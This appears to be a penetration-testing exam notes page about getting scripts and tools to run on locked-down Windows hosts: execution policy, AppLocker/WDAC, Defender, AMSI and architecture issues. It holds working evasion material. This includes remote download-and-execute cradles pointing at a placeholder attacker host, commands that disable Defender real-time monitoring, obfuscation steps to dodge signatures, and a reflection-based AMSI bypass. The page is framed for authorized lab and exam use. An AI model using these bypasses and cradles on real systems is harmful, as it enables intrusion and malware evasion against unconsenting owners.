# Script and tool execution blocked

Name the blocker before changing anything: the fix differs for the PowerShell policy, language mode, AppLocker/WDAC, Defender and plain architecture mismatch.

## Which blocker?
| Symptom | Cause |
| --- | --- |
| `running scripts is disabled on this system` | PowerShell execution policy |
| `Cannot invoke method` / `Cannot dot-source`; `Method invocation is supported only on core types in this language mode` | Constrained Language Mode (AppLocker/WDAC) |
| `This program is blocked by group policy` / `Access is denied` for an exe in a user-writable path | AppLocker or WDAC path/publisher rules |
| `This script contains malicious content and has been blocked by your antivirus software` | AMSI / Defender |
| File vanishes after download or copy | Defender real-time protection quarantined it |
| `The specified executable is not a valid application for this OS platform` / `is not a valid Win32 application` | Architecture mismatch |
| `You must install or update .NET` | Wrong .NET runtime for the binary |

## Execution policy
Anyone who can run a command can override it.

```powershell
Get-ExecutionPolicy -List
```
```powershell
powershell -ep bypass -nop -f .\script.ps1
powershell -ep bypass -nop -c ". .\PowerUp.ps1; Invoke-PrivescAudit"
Get-Content .\script.ps1 -Raw | iex
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>:8000/script.ps1')
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
```
- `-Scope Process` needs no admin and ends with the session.
- Dot-sourcing (`. .\x.ps1`) is needed so functions stay in your session; `-f script.ps1` runs it in a child.
- `MachinePolicy` / `UserPolicy` (Group Policy) entries override a `Process`-scope change: read the `-List` table top to bottom.

## Language mode and AppLocker
```powershell
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
Get-ChildItem 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2' -Recurse -ErrorAction SilentlyContinue
```
- `ConstrainedLanguage` → PowerShell tooling is limited; use native binaries (`sc.exe`, `reg.exe`, `icacls`, `net`, `schtasks`), compiled `.exe` tools, or a different execution host.
- Rules often allow writable-by-default directories under the allowed prefixes:
```cmd
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
icacls C:\Windows\tracing
icacls C:\Windows\System32\spool\drivers\color
```
- Test one harmless exe from a candidate directory before moving the whole toolset. Rules by publisher/hash need a different route (signed binary, LOLBAS).
- AppLocker `.exe` rules do not cover DLLs by default and often skip `.cmd`/`.bat`/`.msi`.

## Defender
```powershell
Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureVersion
Get-MpPreference | Select-Object ExclusionPath,ExclusionExtension,ExclusionProcess
Get-MpThreatDetection | Select-Object InitialDetectionTime,ProcessName,Resources
```
- `Resources` shows which file was detected: that file, not the whole toolset, is the problem.
- Real-time protection already off or an exclusion path present: run tools from the excluded path.
- Check `AMSI` messages vs file quarantine: AMSI blocks script content in memory; Defender real-time removes files on disk.
- Local admin only: exclusion or real-time switch. Tamper Protection on → these commands are refused.
```powershell
Add-MpPreference -ExclusionPath 'C:\Temp'
Set-MpPreference -DisableRealtimeMonitoring $true
```
- Undo what you changed: `Remove-MpPreference -ExclusionPath 'C:\Temp'`, `Set-MpPreference -DisableRealtimeMonitoring $false`.
- Note it in the report: a changed AV setting is a modification of the target.
- AMSI message instead of a quarantined file → [AMSI](#amsi-only-if-confirmed-as-the-blocker).

## AMSI: only if confirmed as the blocker
AMSI scans script content (PowerShell, VBA, JScript, .NET `Assembly.Load`) in memory before it runs. Do the steps in order and stop at the first one that works; most boxes never need the bypass.

### 1. Confirm AMSI is what blocks you
```powershell
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```
- Microsoft's documented test string. Blocked with "This script contains malicious content…" = AMSI is active in this process. Printed back normally = AMSI is not scanning here: your problem is something else (policy, file quarantine, architecture above).
- Run the test in the same shell type that failed (a different PowerShell host or an `-ep bypass` child behaves the same; `cmd.exe` and native `.exe` are never scanned by AMSI).
- Note the failing content: AMSI matches strings in the script (function names like `Invoke-Mimikatz`, `PowerView`, shellcode loaders), not the file name.

### 2. Avoid it without touching AMSI
- Use the native command (`sc.exe`, `reg.exe`, `icacls`, `schtasks`) or a compiled `.exe` tool; the Kali-side equivalent (`impacket`, `nxc`, `bloodhound-ce-python`, `certipy`) needs nothing on the target.
- PowerShell 2 has no AMSI. Only if the feature is installed:
```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
powershell -version 2 -nop -ep bypass -c "$PSVersionTable.PSVersion"
```
- Requires .NET 3.5 / PowerShell 2 present; absent on current builds by default.

### 3. Change the script, not AMSI (obfuscation)
Signatures key on well-known strings. Edit your own copy: strip comments, rename identifiers, retest.

```bash
cp PowerUp.ps1 pu.ps1
sed -i -e '/<#/,/#>/d' -e '/^[[:space:]]*#/d' pu.ps1
sed -i -e 's/Invoke-PrivescAudit/Invoke-PA/g' -e 's/Get-ModifiableServiceFile/Get-MSF/g' -e 's/PowerUp/PU/g' pu.ps1
```
```powershell
. .\pu.ps1; Invoke-PA
```
- Rename consistently (every call site of a function). Block-comment removal assumes `<#` / `#>` are not inside strings. Fix parse errors by diffing against the original.
- Flagged string inside a command line: split it. `'Am'+'si'`, `"Inv"+"oke-Expression"`, or call through a variable: `$c='iex';& $c ...`. Backticks inside names (`I`n`voke`) also work for cmdlet names in PowerShell.
- Reverse shell download cradles: host the file under a plain name (`/a.txt`) and serve it over HTTP; the name was never the signature.
- Automated obfuscators (e.g. `Invoke-Obfuscation`) exist; try small manual renames first: heavily obfuscated output is itself flagged more often.

### 4. Disable AMSI in your own process (last resort)
Per-process, per-session, and it must run before the flagged content loads. Run it in the same PowerShell process, then load the tool. It does not persist and does not weaken other users' sessions.

Reflection (PowerShell 5.1; the plain string is signatured, so split it):
```powershell
$t = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$f = $t.GetField('am'+'siInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```
Verify the bypass with the test string from step 1, then load the tool:
```powershell
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>:8000/pu.ps1')
```
- Test string now prints back = state change worked.
- Flagged on its own (behavioural or string detection on that line): break the strings differently, or run it from a script file you obfuscated per step 3.
- Windows builds from late 2022/2023 onward and updated Defender signatures flag older one-liners; lab-test your exact snippet on a VM matching the target build before relying on it.
- Memory patching of `AmsiScanBuffer` (patch the function in `amsi.dll` in the current process via `VirtualProtect` / `Marshal.Copy`) is the other common family. It needs a C# `Add-Type` block that is itself often flagged; use a maintained public implementation and the same obfuscation rules, e.g. the AMSI entries in [REFERENCES](../REFERENCES.md), rather than hand-typing one on the exam.
- .NET tools loaded with `[Reflection.Assembly]::Load(...)` are scanned too on .NET 4.8+; run the compiled `.exe` from disk instead, or bypass first.

### 5. Report and cleanup
- Every bypass is an attack step: put the exact snippet and the reason (AMSI test-string result) in the report so a reader can replicate.
- Nothing to undo for process-local changes. Undo anything persistent you set (exclusions, features) → [Defender](#defender).
- Scope: use only on in-scope exam hosts. Do not ship patched tooling out of the exam environment.

## Architecture and runtime
```powershell
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
[Environment]::Version
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty -Name Version -ErrorAction SilentlyContinue | Select-Object PSChildName,Version
```
- 32-bit PowerShell on a 64-bit OS (reverse shell from a 32-bit service): reach the 64-bit one:
```powershell
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -c "[Environment]::Is64BitProcess"
```
- Tool needs .NET 4.x but the host has 3.5: compile for the older target or pick the `-NET35` build.
- Build the exe for the right architecture: `x86_64-w64-mingw32-gcc` / `i686-w64-mingw32-gcc` ([compiling](../foothold/public-exploits.md#compiling-exploits)).

## Transfer integrity
```powershell
Get-FileHash '<FILE>' -Algorithm SHA256
```
Compare with Kali (`sha256sum`). Truncated transfers also give "not a valid Win32 application" ([tool troubleshooting](enumeration.md#tool-troubleshooting)).
